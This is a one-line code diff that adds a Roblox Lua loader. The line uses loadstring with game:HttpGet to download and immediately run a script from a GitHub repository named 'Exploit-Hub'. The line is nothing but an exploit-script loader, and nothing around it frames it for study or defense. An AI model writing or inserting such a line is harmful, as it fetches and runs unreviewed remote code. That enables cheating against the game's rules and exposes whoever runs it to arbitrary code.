@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k00pz/Exploit-Hub/main/Our%20hub%20lmafao", true))()
